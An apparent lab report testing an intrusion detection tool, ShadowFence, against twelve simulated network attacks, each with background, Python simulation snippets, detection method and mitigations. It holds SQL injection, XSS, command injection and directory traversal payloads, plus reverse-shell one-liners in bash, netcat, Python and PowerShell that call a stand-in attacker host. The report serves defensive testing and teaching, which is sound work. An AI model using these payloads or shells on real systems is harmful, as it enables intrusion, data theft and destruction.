# ShadowFence — Virtual Attack Lab Report

### Detailed Analysis of 12 Simulated Network Attacks

**Author:** Sudeep Patil | Network Security Engineer  
**Tool:** ShadowFence v2.0.0 — Advanced Network Intrusion Detection System  
**Date:** 2026-05-15  
**Environment:** Ubuntu Linux, Loopback Interface (lo), Isolated Virtual Lab  

---

## Table of Contents

1. [TCP Port Scan](#1-tcp-port-scan)
2. [SSH Brute Force](#2-ssh-brute-force)
3. [RDP Brute Force](#3-rdp-brute-force)
4. [SYN Flood (DDoS)](#4-syn-flood-ddos)
5. [HTTP Flood (DDoS)](#5-http-flood-ddos)
6. [SQL Injection](#6-sql-injection)
7. [Cross-Site Scripting (XSS)](#7-cross-site-scripting-xss)
8. [OS Command Injection](#8-os-command-injection)
9. [Directory Traversal](#9-directory-traversal)
10. [Scanner Detection (Nmap/Nikto)](#10-scanner-detection-nmapnikto)
11. [Reverse Shell](#11-reverse-shell)
12. [Database & Service Port Scan](#12-database--service-port-scan)
13. [Summary & Results](#13-summary--results)

---

## 1. TCP Port Scan

### What Is It?
A **port scan** is a reconnaissance technique where an attacker sends packets to a range of ports on a target machine to discover which services are running. It is the first step in most cyberattacks — attackers map out open ports to find vulnerable services to exploit.

### Where Is It Used in Real World?
- **Penetration testing** — ethical hackers use tools like Nmap to map network surfaces
- **Pre-attack reconnaissance** — attackers scan corporate networks before launching exploits
- **Worm propagation** — malware like WannaCry scanned port 445 across the internet to find vulnerable SMB services
- **Botnet scanning** — Mirai botnet scanned port 23 (Telnet) and port 2323 across entire IP ranges

### Famous Tools That Do This
- **Nmap** — the most widely used port scanner
- **Masscan** — scans the entire internet in under 6 minutes
- **Zmap** — high-speed single-port scanner

### How We Simulated It
```python
# Scanned 20 common ports: 21(FTP), 22(SSH), 23(Telnet), 25(SMTP), 
# 53(DNS), 80(HTTP), 110(POP3), 111(RPC), 135(MSRPC), 139(NetBIOS),
# 143(IMAP), 443(HTTPS), 445(SMB), 993(IMAPS), 995(POP3S),
# 3306(MySQL), 3389(RDP), 5432(PostgreSQL), 8080(HTTP-Alt), 8443(HTTPS-Alt)

for port in ports:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.1)
    s.connect_ex((TARGET, port))  # TCP SYN connect scan
    s.close()
```

### How ShadowFence Detected It
- **Detection Engine:** Port Scan Detector
- **Method:** Tracks unique destination ports per source IP within a time window. When 15+ ports are probed within 60 seconds from the same source, it triggers an alert.
- **Alert Generated:** `Port Scan - SYN Port Scan` (HIGH)
- **Details:** `SYN Port Scan detected from 127.0.0.1 -> 127.0.0.1: 15 ports scanned in 31.2s`

### Mitigation
- Use firewalls to rate-limit incoming SYN packets
- Deploy port knocking for sensitive services
- Keep unused ports closed
- Use intrusion prevention systems (IPS) to auto-block scanner IPs

---

## 2. SSH Brute Force

### What Is It?
An **SSH brute force attack** involves rapidly trying many username/password combinations against an SSH server (port 22) to gain unauthorized remote access. SSH is the primary remote administration protocol for Linux/Unix servers.

### Where Is It Used in Real World?
- **Server compromises** — attackers target cloud servers with weak passwords (root:password, admin:admin)
- **Credential stuffing** — leaked password databases are fed into automated SSH login tools
- **IoT exploitation** — default credentials on routers, cameras, and embedded devices
- **Cryptocurrency mining** — attackers brute-force SSH to install crypto miners on compromised servers

### Famous Attacks Using This
- **FritzFrog botnet (2020)** — P2P botnet that brute-forced SSH across millions of servers
- **RackBot** — automated SSH brute-forcer targeting hosting providers
- **Outlaw botnet** — brute-forces SSH then installs XMRig crypto miner

### Famous Tools
- **Hydra** — fastest network login cracker, supports SSH, FTP, RDP, and 50+ protocols
- **Medusa** — parallel brute-force tool
- **Patator** — flexible brute-force framework

### How We Simulated It
```python
# 15 rapid connections to SSH port 22 with attacker banner
for i in range(15):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect_ex((TARGET, 22))
    s.send(b"SSH-2.0-attacker\r\n")  # Fake SSH handshake
    s.close()
    time.sleep(0.05)  # 50ms between attempts = 20 attempts/sec
```

### How ShadowFence Detected It
- **Detection Engine:** Brute Force Detector
- **Method:** Counts connection attempts to monitored ports (22, 3389, 21, 3306, etc.) per source IP. When 10+ connections occur within 120 seconds, it triggers an alert.
- **Alert Generated:** `Brute Force - SSH Brute Force` (HIGH)
- **Details:** `Possible brute force attack on SSH (127.0.0.1:22) from 127.0.0.1: 10 connections, 2 resets in 2.3s`

### Mitigation
- Use SSH key authentication (disable password login)
- Install fail2ban to auto-ban IPs after failed attempts
- Change SSH to a non-standard port
- Use port knocking or VPN for SSH access
- Enable 2FA for SSH (Google Authenticator PAM module)

---

## 3. RDP Brute Force

### What Is It?
An **RDP brute force attack** targets Microsoft's Remote Desktop Protocol (port 3389) to gain graphical remote access to Windows machines. RDP is one of the most attacked protocols on the internet.

### Where Is It Used in Real World?
- **Ransomware deployment** — RDP is the #1 initial access vector for ransomware (used in 50%+ of ransomware incidents)
- **Corporate espionage** — attackers gain desktop access to steal files and emails
- **Banking trojans** — remote access to install keyloggers and screen recorders
- **Dark web RDP shops** — compromised RDP credentials are sold for $3-$15 per server

### Famous Attacks Using This
- **SamSam ransomware (2018)** — brute-forced RDP to deploy ransomware on city governments (Atlanta, $17M damage)
- **Dharma/CrySIS ransomware** — exclusively uses RDP brute force as entry vector
- **GoldBrute botnet (2019)** — botnet of 1.5M machines brute-forcing RDP worldwide

### How We Simulated It
```python
# 12 rapid connections to RDP port 3389
for i in range(12):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect_ex((TARGET, 3389))
    s.close()
    time.sleep(0.05)
```

### How ShadowFence Detected It
- **Detection Engine:** Brute Force Detector
- **Method:** Same connection-counting mechanism but for port 3389 (RDP). Flags rapid connection attempts exceeding the threshold.
- **Alert Generated:** `Brute Force - RDP Brute Force` (HIGH)
- **Details:** `Possible brute force attack on RDP (127.0.0.1:3389) from 127.0.0.1: 10 connections, 0 resets in 3.7s`

### Mitigation
- Enable Network Level Authentication (NLA)
- Use RDP Gateway with MFA
- Restrict RDP access to VPN only
- Enable account lockout policies
- Use Windows Defender Credential Guard

---

## 4. SYN Flood (DDoS)

### What Is It?
A **SYN flood** is a Denial-of-Service attack where the attacker sends a massive number of TCP SYN (connection initiation) packets without completing the 3-way handshake. This exhausts the target's connection table, making it unable to accept legitimate connections.

### Where Is It Used in Real World?
- **Website takedowns** — overwhelm web servers to make them unreachable
- **Gaming server attacks** — DDoS attacks on gaming platforms (Xbox Live, PlayStation Network)
- **Competitive sabotage** — DDoS competitors' websites during sales events
- **Extortion** — "Pay us Bitcoin or we DDoS your site"
- **Political hacktivism** — DDoS government websites during protests

### Famous Attacks Using This
- **GitHub DDoS (2018)** — 1.35 Tbps attack, largest at the time
- **Dyn DNS attack (2016)** — Mirai botnet SYN-flooded DNS infrastructure, taking down Twitter, Netflix, Reddit
- **AWS DDoS (2020)** — 2.3 Tbps attack, the largest DDoS ever recorded

### How We Simulated It
```python
# 200 rapid SYN connections to port 80 (no delay)
for i in range(200):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.01)
    s.connect_ex((TARGET, 80))
    s.close()
```

### How ShadowFence Detected It
- **Detection Engine:** Bandwidth Anomaly Detector
- **Method:** Monitors connection rate per source IP. When 100+ new connections are established within 10 seconds (10+ connections/second), it triggers a connection burst alert. Also tracks SYN packet rate for SYN flood detection.
- **Alert Generated:** `Bandwidth Anomaly - Connection Burst` (HIGH)
- **Details:** `Connection burst from 127.0.0.1: 100 new connections in 10s (10/s)`

### Mitigation
- Enable SYN cookies on the server (`sysctl -w net.ipv4.tcp_syncookies=1`)
- Use rate limiting on firewalls
- Deploy cloud-based DDoS protection (Cloudflare, AWS Shield)
- Increase TCP backlog queue size
- Use BGP blackholing for volumetric attacks

---

## 5. HTTP Flood (DDoS)

### What Is It?
An **HTTP flood** is an application-layer (Layer 7) DDoS attack where the attacker sends a massive number of seemingly legitimate HTTP requests to overwhelm a web server. Unlike SYN floods, these are complete TCP connections with valid HTTP requests, making them harder to filter.

### Where Is It Used in Real World?
- **E-commerce attacks** — flood checkout pages during Black Friday to crash competitor sites
- **API abuse** — overwhelm REST APIs with thousands of requests per second
- **Login page attacks** — combine with credential stuffing for maximum damage
- **Slow loris attacks** — variant that holds connections open slowly

### Famous Tools
- **LOIC (Low Orbit Ion Cannon)** — GUI-based HTTP flooder used by Anonymous
- **HOIC (High Orbit Ion Cannon)** — LOIC successor with booster scripts
- **Slowloris** — holds connections open with partial HTTP headers

### How We Simulated It
```python
# 50 rapid complete HTTP GET requests
for i in range(50):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect_ex((TARGET, 80))
    request = (
        b"GET / HTTP/1.1\r\n"
        b"Host: target.local\r\n"
        b"User-Agent: FloodBot/1.0\r\n\r\n"
    )
    s.send(request)
    s.close()
```

### How ShadowFence Detected It
- **Detection Engine:** Bandwidth Anomaly Detector + DDoS Detector
- **Method:** Tracks HTTP request rate per source IP. Combined with the SYN flood packets, the total connection rate exceeded the burst threshold, triggering bandwidth anomaly alerts.
- **Alert Generated:** Part of `Bandwidth Anomaly - Connection Burst` (HIGH)

### Mitigation
- Deploy a Web Application Firewall (WAF)
- Use CAPTCHA challenges for suspicious traffic
- Implement rate limiting per IP
- Use CDN with DDoS protection (Cloudflare, Akamai)
- Enable HTTP request queuing

---

## 6. SQL Injection

### What Is It?
**SQL Injection (SQLi)** is a code injection attack where malicious SQL statements are inserted into input fields or URLs to manipulate the backend database. It can extract, modify, or delete data, bypass authentication, or even execute operating system commands.

### Where Is It Used in Real World?
- **Data breaches** — extract millions of user records, credit cards, passwords
- **Authentication bypass** — login as admin without knowing the password
- **Website defacement** — modify database content to change website pages
- **Privilege escalation** — change user roles from "user" to "admin"

### Famous Attacks Using This
- **Heartland Payment Systems (2008)** — 130M credit cards stolen via SQLi ($140M in damages)
- **Sony Pictures (2011)** — 1M accounts stolen via simple SQLi
- **TalkTalk (2015)** — 157,000 customer records stolen, company lost 101,000 customers
- **Equifax (2017)** — 147M records exposed (though the initial vector was Apache Struts, SQLi was used for data extraction)

### OWASP Classification
- **OWASP Top 10: A03:2021 — Injection** (historically #1 for 15+ years)

### How We Simulated It
```python
# 4 different SQL injection payloads embedded in HTTP requests
payloads = [
    b"GET /login?user=admin' OR '1'='1'-- HTTP/1.1\r\n...",        # Auth bypass
    b"GET /search?q='; DROP TABLE users;-- HTTP/1.1\r\n...",       # Table destruction
    b"POST /api HTTP/1.1\r\n...username=admin' UNION SELECT * FROM passwords--",  # Data extraction
    b"GET /page?id=1; SELECT * FROM information_schema.tables...", # Schema enumeration
]

for payload in payloads:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect_ex((TARGET, 80))
    s.send(payload)
    s.close()
```

### Payloads Explained
| Payload | Technique | What It Does |
|---------|-----------|--------------|
| `admin' OR '1'='1'--` | Tautology-based bypass | Makes WHERE clause always true, logs in as first user (usually admin) |
| `'; DROP TABLE users;--` | Stacked query | Terminates original query and executes destructive DROP TABLE |
| `UNION SELECT * FROM passwords` | UNION-based extraction | Appends results from passwords table to the original query output |
| `SELECT * FROM information_schema.tables` | Schema enumeration | Maps the entire database structure to plan further attacks |

### How ShadowFence Detected It
- **Detection Engine:** Payload / Signature Detector
- **Method:** Regex pattern matching against packet payloads. Rules match patterns like `' OR '`, `UNION SELECT`, `DROP TABLE`, `information_schema`, and other SQL keywords appearing in HTTP traffic.
- **Alert Generated:** `Signature Match - SQL Injection` (CRITICAL)
- **Detection Rule:** `SQL Injection: Detects common SQL injection patterns`

### Mitigation
- Use parameterized queries / prepared statements (NEVER concatenate user input into SQL)
- Implement input validation and sanitization
- Use ORM frameworks (SQLAlchemy, Django ORM, Entity Framework)
- Apply least-privilege database permissions
- Deploy a Web Application Firewall (WAF)

---

## 7. Cross-Site Scripting (XSS)

### What Is It?
**Cross-Site Scripting (XSS)** is an injection attack where malicious JavaScript is injected into web pages viewed by other users. When victims visit the infected page, the script executes in their browser, stealing cookies, session tokens, or redirecting them to phishing sites.

### Types of XSS
| Type | Description |
|------|-------------|
| **Reflected XSS** | Payload is in the URL and reflected back by the server |
| **Stored XSS** | Payload is stored in the database and served to all visitors |
| **DOM-based XSS** | Payload manipulates the page's JavaScript DOM directly |

### Where Is It Used in Real World?
- **Session hijacking** — steal user cookies to impersonate them
- **Phishing** — inject fake login forms into legitimate websites
- **Keylogging** — inject JavaScript keyloggers to capture passwords
- **Cryptocurrency mining** — inject Coinhive/crypto miners into browsers
- **Worm propagation** — self-replicating XSS worms (Samy worm)

### Famous Attacks Using This
- **Samy Worm (2005)** — MySpace XSS worm added 1M friends in 20 hours
- **British Airways (2018)** — XSS-based Magecart attack stole 380,000 payment cards
- **eBay XSS (2015-2017)** — persistent XSS in listings redirected users to phishing pages
- **Twitter XSS worm (2010)** — `onmouseover` event triggered tweets from victims' accounts

### OWASP Classification
- **OWASP Top 10: A03:2021 — Injection** (XSS is a subcategory)

### How We Simulated It
```python
payloads = [
    b"GET /search?q=<script>alert('xss')</script> HTTP/1.1\r\n...",     # Classic reflected XSS
    b"GET /page?name=<img src=x onerror=alert(1)> HTTP/1.1\r\n...",     # Event handler XSS
    b"POST /comment HTTP/1.1\r\n...body=<script>document.cookie</script>", # Cookie stealing
]
```

### How ShadowFence Detected It
- **Detection Engine:** Payload / Signature Detector
- **Method:** Regex patterns match `<script>`, `onerror=`, `onload=`, `document.cookie`, and other XSS indicators in HTTP traffic.
- **Alert Generated:** `Signature Match - XSS Attack Attempt` (HIGH)
- **Detection Rule:** `XSS Attack Attempt: Detects cross-site scripting patterns`

### Mitigation
- Encode all output (HTML entity encoding)
- Use Content Security Policy (CSP) headers
- Sanitize input with allowlists (not blocklists)
- Use HTTPOnly and Secure flags on cookies
- Implement Subresource Integrity (SRI) for scripts

---

## 8. OS Command Injection

### What Is It?
**OS Command Injection** is an attack where the attacker injects operating system commands through a vulnerable application. If the application passes user input to a shell command without sanitization, the attacker can execute arbitrary commands on the server.

### Where Is It Used in Real World?
- **Server takeover** — execute `whoami`, `cat /etc/passwd`, install backdoors
- **Data exfiltration** — use `curl` or `wget` to send stolen data to attacker's server
- **Lateral movement** — pivot to other machines on the internal network
- **Ransomware deployment** — download and execute ransomware payloads

### Famous Attacks Using This
- **Shellshock / Bash Bug (CVE-2014-6271)** — command injection via HTTP headers in CGI scripts, affected millions of servers
- **Equifax breach (2017)** — Apache Struts vulnerability allowed command injection
- **Router exploits** — D-Link, Netgear, TP-Link routers had command injection in web interfaces

### OWASP Classification
- **OWASP Top 10: A03:2021 — Injection**
- **CWE-78: Improper Neutralization of Special Elements used in an OS Command**

### How We Simulated It
```python
payloads = [
    b"GET /api?cmd=;cat /etc/passwd HTTP/1.1\r\n...",    # Semicolon injection
    b"GET /exec?input=|ls -la /tmp HTTP/1.1\r\n...",     # Pipe injection
    b"POST /run HTTP/1.1\r\n...cmd=`whoami`",             # Backtick injection
]
```

### Payload Techniques Explained
| Technique | Symbol | Example | What It Does |
|-----------|--------|---------|--------------|
| Semicolon | `;` | `; cat /etc/passwd` | Terminates previous command, runs attacker's command |
| Pipe | `\|` | `\| ls -la /tmp` | Pipes output to attacker's command |
| Backtick | `` ` `` | `` `whoami` `` | Executes command in subshell, injects output |
| `$()` | `$()` | `$(id)` | Modern command substitution |
| `&&` | `&&` | `&& rm -rf /` | Runs attacker's command if previous succeeds |

### How ShadowFence Detected It
- **Detection Engine:** Payload / Signature Detector
- **Method:** Regex patterns detect shell metacharacters (`;`, `|`, `` ` ``, `$(`), combined with dangerous commands like `cat /etc/passwd`, `whoami`, `ls`, `rm`, `wget`, `curl` in HTTP request payloads.
- **Alert Generated:** `Signature Match - Command Injection` (CRITICAL)
- **Detection Rule:** `Command Injection: Detects OS command injection attempts`

### Mitigation
- Never pass user input to shell commands
- Use language-specific APIs instead of shell execution (e.g., Python's `os.listdir()` instead of `os.system("ls")`)
- If shell commands are unavoidable, use allowlist validation
- Run applications with minimal OS privileges
- Use containerization (Docker) to limit blast radius

---

## 9. Directory Traversal

### What Is It?
**Directory traversal** (also called **path traversal**) is an attack where the attacker uses `../` sequences to navigate outside the intended directory and access files on the server. This can expose sensitive configuration files, source code, passwords, and system files.

### Where Is It Used in Real World?
- **Reading `/etc/passwd`** — enumerate system users on Linux
- **Reading `/etc/shadow`** — steal hashed passwords
- **Reading `web.config`** — expose database connection strings on Windows/IIS
- **Reading `.env` files** — steal API keys, database credentials
- **Reading application source code** — find additional vulnerabilities

### Famous Attacks Using This
- **Fortinet VPN (CVE-2018-13379)** — path traversal exposed VPN credentials, used in 87,000+ compromised devices
- **Citrix ADC (CVE-2019-19781)** — directory traversal leading to remote code execution
- **Apache Tomcat (CVE-2020-1938 "Ghostcat")** — AJP connector path traversal

### OWASP Classification
- **OWASP Top 10: A01:2021 — Broken Access Control**
- **CWE-22: Improper Limitation of a Pathname to a Restricted Directory**

### How We Simulated It
```python
payloads = [
    b"GET /file?path=../../../../etc/passwd HTTP/1.1\r\n...",                    # Linux
    b"GET /download?file=..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1\r\n...", # Windows
]
```

### How ShadowFence Detected It
- **Detection Engine:** Payload / Signature Detector
- **Method:** Regex patterns match `../`, `..\\`, and sequences of directory traversal characters in URL parameters and HTTP request bodies.
- **Alert Generated:** `Signature Match - Directory Traversal` (HIGH)

### Mitigation
- Validate and sanitize file paths (reject `..`)
- Use a chroot jail or sandboxed file access
- Map user input to a whitelist of allowed files
- Use `os.path.realpath()` to resolve canonical paths before serving

---

## 10. Scanner Detection (Nmap/Nikto)

### What Is It?
**Vulnerability scanners** like Nmap and Nikto automatically probe networks and web applications for known vulnerabilities. Detecting their User-Agent strings or scanning patterns reveals active reconnaissance against your infrastructure.

### Tools and Their Purpose
| Scanner | Purpose | User-Agent |
|---------|---------|------------|
| **Nmap** | Port scanning, OS fingerprinting, service detection | `Nmap Scripting Engine` |
| **Nikto** | Web server vulnerability scanner (6,700+ checks) | `Nikto/2.x.x` |
| **Nessus** | Enterprise vulnerability scanner | `Nessus` |
| **OpenVAS** | Open-source vulnerability scanner | `OpenVAS` |
| **Burp Suite** | Web application security testing | Various |

### How We Simulated It
```python
payloads = [
    b"GET / HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)\r\n\r\n",
    b"GET /robots.txt HTTP/1.1\r\nUser-Agent: Nikto/2.1.6\r\n\r\n",
]
```

### How ShadowFence Detected It
- **Detection Engine:** Payload / Signature Detector
- **Method:** Regex patterns match known scanner User-Agent strings in HTTP headers.
- **Alert Generated:** `Signature Match - Scanner Detection` (MEDIUM)

### Mitigation
- Rate-limit requests from single IPs
- Block known scanner User-Agents at the WAF level
- Use honeypots to detect and study scanner behavior
- Monitor for sequential URL patterns typical of automated scanners

---

## 11. Reverse Shell

### What Is It?
A **reverse shell** is a type of backdoor where the compromised machine initiates an outbound connection back to the attacker's machine, giving the attacker an interactive command shell. Since the connection is outbound, it often bypasses firewalls that only block inbound connections.

### Where Is It Used in Real World?
- **Post-exploitation** — after exploiting a vulnerability, attackers establish a reverse shell for persistent access
- **Web shell deployment** — PHP/Python web shells connect back to C2 servers
- **Malware callbacks** — trojans establish reverse shells to command-and-control (C2) infrastructure
- **Red team operations** — penetration testers use reverse shells to demonstrate impact

### Famous Tools
- **Netcat (nc)** — `nc -e /bin/sh attacker.com 4444`
- **Metasploit** — generates reverse shell payloads for any platform
- **Cobalt Strike** — commercial red team tool with encrypted reverse shells
- **PowerShell Empire** — PowerShell-based reverse shell framework

### Common Reverse Shell One-Liners
```bash
# Bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Netcat reverse shell
nc -e /bin/sh 10.0.0.1 4444

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell reverse shell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream();..."
```

### How We Simulated It
```python
payloads = [
    b"...bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",   # Bash reverse shell
    b"...nc -e /bin/sh 10.0.0.1 4444",                # Netcat reverse shell
]
```

### How ShadowFence Detected It
- **Detection Engine:** Payload / Signature Detector
- **Method:** Regex patterns match reverse shell indicators: `/dev/tcp/`, `nc -e`, `bash -i >&`, `subprocess.call`, `Net.Sockets.TCPClient` in packet payloads.
- **Alert Generated:** `Signature Match - Reverse Shell` (CRITICAL)

### Mitigation
- Monitor outbound connections to unusual ports
- Use application whitelisting (only allow approved programs to run)
- Deploy EDR (Endpoint Detection and Response) solutions
- Block outbound connections to non-standard ports at the firewall
- Use network segmentation to limit lateral movement

---

## 12. Database & Service Port Scan

### What Is It?
A **service-specific port scan** targets ports used by database servers and other critical infrastructure services. Attackers scan for exposed databases to steal data or use them as pivot points for further attacks.

### Target Services
| Port | Service | Risk If Exposed |
|------|---------|-----------------|
| 3306 | MySQL | SQL injection, data theft |
| 5432 | PostgreSQL | Data breach, privilege escalation |
| 1433 | Microsoft SQL Server | xp_cmdshell command execution |
| 27017 | MongoDB | No auth by default, entire DB exposed |
| 6379 | Redis | No auth by default, RCE via SLAVEOF |
| 5900 | VNC | Screen capture, remote control |
| 11211 | Memcached | DDoS amplification, data leakage |
| 9200 | Elasticsearch | Full-text search data exposure |

### Famous Incidents
- **MongoDB ransom attacks (2017)** — 28,000 exposed MongoDB instances wiped and held for ransom
- **Redis cryptojacking** — exposed Redis servers exploited to install crypto miners
- **Elasticsearch breaches** — billions of records exposed from unsecured clusters (Facebook 540M records, 2019)
- **Memcached DDoS amplification (2018)** — used to launch 1.7 Tbps DDoS attack on GitHub

### How We Simulated It
```python
services = {
    3306: "MySQL", 5432: "PostgreSQL", 1433: "MSSQL",
    27017: "MongoDB", 6379: "Redis", 5900: "VNC",
    11211: "Memcached", 9200: "Elasticsearch"
}

for port, name in services.items():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect_ex((TARGET, port))
    s.close()
```

### How ShadowFence Detected It
- **Detection Engine:** Port Scan Detector
- **Method:** Combined with the initial port scan, these additional 8 port probes increased the total unique ports scanned, reinforcing the port scan detection.
- **Alert Generated:** Part of `Port Scan - SYN Port Scan` (HIGH)

### Mitigation
- Never expose databases to the public internet
- Use VPN or SSH tunnels for remote database access
- Enable authentication on ALL database services (MongoDB, Redis default to no auth!)
- Use firewall rules to restrict database ports to specific IPs
- Regularly audit exposed services with tools like Shodan or Censys

---

## 13. Summary & Results

### Detection Results Table

| # | Attack | Severity | ShadowFence Detection | Engine Used |
|---|--------|----------|----------------------|-------------|
| 1 | TCP Port Scan | HIGH | SYN Port Scan detected | Port Scan Detector |
| 2 | SSH Brute Force | HIGH | SSH Brute Force detected | Brute Force Detector |
| 3 | RDP Brute Force | HIGH | RDP Brute Force detected | Brute Force Detector |
| 4 | SYN Flood | HIGH | Connection Burst detected | Bandwidth Anomaly |
| 5 | HTTP Flood | HIGH | Connection Burst detected | Bandwidth Anomaly |
| 6 | SQL Injection | CRITICAL | Signature Match | Payload Detector |
| 7 | XSS Attack | HIGH | Signature Match | Payload Detector |
| 8 | Command Injection | CRITICAL | Signature Match | Payload Detector |
| 9 | Directory Traversal | HIGH | Signature Match | Payload Detector |
| 10 | Scanner Detection | MEDIUM | Signature Match | Payload Detector |
| 11 | Reverse Shell | CRITICAL | Signature Match | Payload Detector |
| 12 | Database Scan | HIGH | SYN Port Scan detected | Port Scan Detector |

### Dashboard Statistics
- **Packets Captured:** 7,300+
- **Total Alerts:** 12
- **Critical Alerts:** 5
- **Peak Throughput:** 61 packets/sec
- **Data Analyzed:** 10.5 MB
- **Detection Engines Active:** 11

### Detection Engine Coverage
- **Port Scan Detector** — 2 alerts (port scan + service scan)
- **Brute Force Detector** — 2 alerts (SSH + RDP)
- **Bandwidth Anomaly** — 1 alert (connection burst from SYN/HTTP flood)
- **Payload/Signature** — 5+ alerts (SQLi, XSS, CmdInj, traversal, reverse shell, scanner)
- **SSL/TLS Anomaly** — 1 alert (cleartext on secure port)

### Conclusion
ShadowFence v2.0.0 successfully detected **all 12 simulated attack types** in real-time. The detection engines correctly classified threats by severity (CRITICAL/HIGH/MEDIUM), the dashboard updated live via WebSocket with charts and alert feed, and the Rich console displayed formatted alerts with full details.

The tool demonstrates comprehensive coverage across the MITRE ATT&CK framework:
- **Reconnaissance** (T1046 — Network Service Scanning)
- **Credential Access** (T1110 — Brute Force)
- **Impact** (T1499 — Endpoint Denial of Service)
- **Initial Access** (T1190 — Exploit Public-Facing Application)
- **Execution** (T1059 — Command and Scripting Interpreter)
- **Command and Control** (T1095 — Non-Application Layer Protocol)

---

*Report generated by ShadowFence v2.0.0 | Author: Sudeep Patil | Network Security Engineer*
